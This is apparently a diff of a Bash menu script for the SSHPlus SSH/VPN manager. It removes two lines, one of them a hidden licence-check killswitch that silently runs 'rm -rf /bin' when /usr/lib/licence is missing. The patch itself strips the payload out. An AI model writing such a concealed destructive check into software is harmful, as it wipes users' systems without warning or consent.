@@ -48,7 +48,6 @@ comando[0]="$1"
 comando[1]="$2"
  (
 [[ -e $HOME/fim ]] && rm $HOME/fim
-[[ ! -d /etc/SSHPlus ]] && rm -rf /bin/menu
 ${comando[0]} > /dev/null 2>&1
 ${comando[1]} > /dev/null 2>&1
 touch $HOME/fim
@@ -167,7 +166,6 @@ stsl=$(ps x | grep "limiter"|grep -v grep > /dev/null && echo -e "${cor3}ON" || 
 stsu=$(ps x | grep "udpvpn"|grep -v grep > /dev/null && echo -e "${cor3}ON " || echo -e "${cor2}OFF")
 stsom=$(ps x | grep "shutdown -r 16:00"|grep -v grep > /dev/null && echo -e "${cor3}ON" || echo -e "${cor2}OFF")
 autm=$(grep "menu;" /etc/profile > /dev/null && echo -e "${cor3}ON " || echo -e "${cor2}OFF")
-[[ ! -e /usr/lib/licence ]] && rm -rf /bin > /dev/null 2>&1
 if [[ "$(grep -c "Ubuntu" /etc/issue.net)" = "1" ]]; then
 system=$(cut -d' ' -f1 /etc/issue.net)
 system+=$(echo ' ')
